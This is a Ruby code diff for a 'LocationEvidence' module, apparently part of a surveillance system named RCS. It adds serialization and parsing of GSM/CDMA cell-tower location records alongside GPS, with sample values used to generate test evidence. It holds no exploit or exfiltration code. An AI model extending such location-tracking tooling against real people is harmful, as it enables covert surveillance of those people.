@@ -20,14 +20,16 @@ module LocationEvidence
 
     case @loc_type
       when LOCATION_GPS
-        content.write [LOCATION_GPS, 0, 0].pack('L*')
+        content.write [@loc_type, 0, 0].pack('L*')
         content.write Time.now.getutc.to_filetime.pack('L*')
         content.write GPS_Position.struct(45.12345, 9.54321)
         content.write [ ELEM_DELIMITER ].pack('L')
 
-      when LOCATION_GSM
-
-      when LOCATION_CDMA
+      when LOCATION_GSM, LOCATION_CDMA
+        content.write [@loc_type, 0, 0].pack('L*')
+        content.write Time.now.getutc.to_filetime.pack('L*')
+        content.write CELL_Position.struct(222, 1, 61208, 528, -92, 0)
+        content.write [ ELEM_DELIMITER ].pack('L')
 
       when LOCATION_WIFI
         content.write ["\xAA\xBB\xCC\xDD\xEE\xFF", "\x00\x11\x22\x33\x44\x55", "\xAB\xCD\xEF\x01\x23\x45"].sample
@@ -49,10 +51,8 @@ module LocationEvidence
   end
 
   def additional_header
-    #@loc_type = [LOCATION_GPS, LOCATION_GSM, LOCATION_CDMA, LOCATION_WIFI, LOCATION_IP].sample
-    @loc_type = [LOCATION_GPS].sample
-    #@nstruct = (@loc_type == LOCATION_IP) ? 1 : rand(5) + 1
-    @nstruct = 1
+    @loc_type = [LOCATION_GPS, LOCATION_GSM, LOCATION_CDMA, LOCATION_WIFI, LOCATION_IP].sample
+    @nstruct = (@loc_type == LOCATION_IP) ? 1 : rand(5) + 1
     header = StringIO.new
     header.write [LOCATION_VERSION, @loc_type, @nstruct].pack("I*")
     
@@ -107,18 +107,36 @@ module LocationEvidence
         until stream.eof?
           type, size, version = stream.read(12).unpack('L*')
           @info[:acquired] = Time.from_filetime(*stream.read(8).unpack('L*'))
-
           gps = GPS_Position.new
           gps.read stream
-
-          @info[:location] = "%f %f" % [gps.latitude, gps.longitude]
-
+          @info[:location] = "%.7f %.7f" % [gps.latitude, gps.longitude]
           delim = stream.read(4).unpack('L').first
-          raise EvidenceDeserializeError.new("Malformed LOCATION (missing delimiter)") unless delim == ELEM_DELIMITER
+          raise EvidenceDeserializeError.new("Malformed LOCATION GPS (missing delimiter)") unless delim == ELEM_DELIMITER
 
           # this is not the real clone! redefined clone ...
           evidences << self.clone
         end
+      when LOCATION_GSM, LOCATION_CDMA
+        @info[:source] = (@info[:loc_type] == LOCATION_GSM) ? 'GSM' : 'CDMA'
+        until stream.eof?
+          type, size, version = stream.read(12).unpack('L*')
+          @info[:acquired] = Time.from_filetime(*stream.read(8).unpack('L*'))
+          cell = CELL_Position.new
+          cell.read stream
+
+          if @info[:loc_type] == LOCATION_GSM then
+            @info[:location] = "MCC:#{cell.mcc} MNC:#{cell.mnc} LAC:#{cell.lac} CID:#{cell.cid} dBm:#{cell.db} ADV:#{cell.adv} AGE:0"
+          else
+            @info[:location] = "MCC:#{cell.mcc} SID:#{cell.mnc} NID:#{cell.lac} BID:#{cell.cid} dBm:#{cell.db} ADV:#{cell.adv} AGE:0"
+          end
+
+          delim = stream.read(4).unpack('L').first
+          raise EvidenceDeserializeError.new("Malformed LOCATION CELL (missing delimiter)") unless delim == ELEM_DELIMITER
+
+          # this is not the real clone! redefined clone ...
+          evidences << self.clone
+        end
+
       else
         raise EvidenceDeserializeError.new("Unsupported LOCATION type")
     end
@@ -189,32 +207,58 @@ class GPS_Position
     stream.read(12*4)
     stream.read(12*4)
     stream.read(12*4)
-    
   end
 end
 
-=begin
-    DWORD cbSize;                       // @field structure size in bytes
-    DWORD dwParams;                     // @field indicates valid parameters
-    DWORD dwMobileCountryCode;          // @field TBD
-    DWORD dwMobileNetworkCode;          // @field TBD
-    DWORD dwLocationAreaCode;           // @field TBD
-    DWORD dwCellID;                     // @field TBD
-    DWORD dwBaseStationID;              // @field TBD
-    DWORD dwBroadcastControlChannel;    // @field TBD
-    DWORD dwRxLevel;                    // @field Value from 0-63 (see GSM 05.08, 8.1.4)
-    DWORD dwRxLevelFull;                // @field Value from 0-63 (see GSM 05.08, 8.1.4)
-    DWORD dwRxLevelSub;                 // @field Value from 0-63 (see GSM 05.08, 8.1.4)
-    DWORD dwRxQuality;                  // @field Value from 0-7  (see GSM 05.08, 8.2.4)
-    DWORD dwRxQualityFull;              // @field Value from 0-7  (see GSM 05.08, 8.2.4)
-    DWORD dwRxQualitySub;               // @field Value from 0-7  (see GSM 05.08, 8.2.4)
-    DWORD dwIdleTimeSlot;               // @field TBD
-    DWORD dwTimingAdvance;              // @field TBD
-    DWORD dwGPRSCellID;                 // @field TBD
-    DWORD dwGPRSBaseStationID;          // @field TBD
-    DWORD dwNumBCCH;                    // @field TBD
-    BYTE rgbBCCH[MAXLENGTH_BCCH];       // @field TBD
-    BYTE rgbNMR[MAXLENGTH_NMR];         // @field TBD
-=end
+
+class CELL_Position
+
+  attr_reader :mcc, :mnc, :lac, :cid, :db, :adv
+  
+  def self.size
+    self.struct(0,0,0,0,0,0).bytesize
+  end
+
+  def self.struct(mcc, mnc, lac, cid, db, adv)
+    str = ''
+    str += [0].pack('l')    # DWORD cbSize;                       // @field structure size in bytes
+    str += [0].pack('l')    # DWORD dwParams;                     // @field indicates valid parameters
+    str += [mcc].pack('l')  # DWORD dwMobileCountryCode;          // @field TBD
+    str += [mnc].pack('l')  # DWORD dwMobileNetworkCode;          // @field TBD
+    str += [lac].pack('l')  # DWORD dwLocationAreaCode;           // @field TBD
+    str += [cid].pack('l')  # DWORD dwCellID;                     // @field TBD
+    str += [0].pack('l')    # DWORD dwBaseStationID;              // @field TBD
+    str += [0].pack('l')    # DWORD dwBroadcastControlChannel;    // @field TBD
+    str += [db].pack('l')   # DWORD dwRxLevel;                    // @field Value from 0-63 (see GSM 05.08, 8.1.4)
+    str += [0].pack('l')    # DWORD dwRxLevelFull;                // @field Value from 0-63 (see GSM 05.08, 8.1.4)
+    str += [0].pack('l')    # DWORD dwRxLevelSub;                 // @field Value from 0-63 (see GSM 05.08, 8.1.4)
+    str += [0].pack('l')    # DWORD dwRxQuality;                  // @field Value from 0-7  (see GSM 05.08, 8.2.4)
+    str += [0].pack('l')    # DWORD dwRxQualityFull;              // @field Value from 0-7  (see GSM 05.08, 8.2.4)
+    str += [0].pack('l')    # DWORD dwRxQualitySub;               // @field Value from 0-7  (see GSM 05.08, 8.2.4)
+    str += [0].pack('l')    # DWORD dwIdleTimeSlot;               // @field TBD
+    str += [adv].pack('l')  # DWORD dwTimingAdvance;              // @field TBD
+    str += [0].pack('l')    # DWORD dwGPRSCellID;                 // @field TBD
+    str += [0].pack('l')    # DWORD dwGPRSBaseStationID;          // @field TBD
+    str += [0].pack('l')    # DWORD dwNumBCCH;                    // @field TBD
+    str += Array.new(64,0).pack('C*')  # BYTE rgbBCCH[MAXLENGTH_BCCH];       // @field TBD
+    str += Array.new(16,0).pack('C*')  # BYTE rgbNMR[MAXLENGTH_NMR];         // @field TBD
+    return str  
+  end
+
+  def read(stream)
+    stream.read(2*4)
+    @mcc = stream.read(4).unpack('l').first
+    @mnc = stream.read(4).unpack('l').first
+    @lac = stream.read(4).unpack('l').first
+    @cid = stream.read(4).unpack('l').first
+    stream.read(2*4)
+    @db = stream.read(4).unpack('l').first
+    stream.read(6*4)
+    @adv = stream.read(4).unpack('l').first
+    stream.read(3*4)
+    stream.read(64+16)
+  end
+
+end
 
 end # ::RCS
